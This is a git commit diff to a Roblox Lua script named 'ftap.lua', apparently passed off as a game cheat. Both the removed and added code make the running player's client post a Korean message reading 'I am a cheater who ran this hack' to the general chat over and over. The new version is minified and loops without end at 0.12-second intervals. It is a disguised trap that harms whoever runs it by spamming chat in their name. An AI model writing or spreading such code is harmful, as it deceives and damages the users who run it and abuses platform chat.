c002e2f416f2f4b54f7725ef97d37baf83aeef3f
yunjun3737-ship-it <yunjun3737@gmail.com>
2026-04-09 20:11:17 +0900

    Update ftap.lua

--- ftap.lua
+++ ftap.lua
@@ -1,18 +1,3 @@
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-local TextChatService = game:GetService("TextChatService")
-
-local message = "저는 이 핵을 실행한 핵쟁이 입니다"
-
-task.spawn(function()
-    for i = 1, 990 do  
-        pcall(function()
-            if TextChatService.TextChannels.RBXGeneral then
-                TextChatService.TextChannels.RBXGeneral:SendAsync(message)
-            end
-        end)
-        task.wait(0.15)  
-    end
-end)
-
-print("채팅 스팸 시작됨")
+local a=game:GetService("Players")local b=game:GetService("TextChatService")local c=a.LocalPlayer
+local d="저는 이 핵을 실행한 핵쟁이 입니다"
+task.spawn(function()while true do pcall(function()if b.TextChannels.RBXGeneral then b.TextChannels.RBXGeneral:SendAsync(d)end end)task.wait(0.12)end end)print("채팅 스팸 시작")
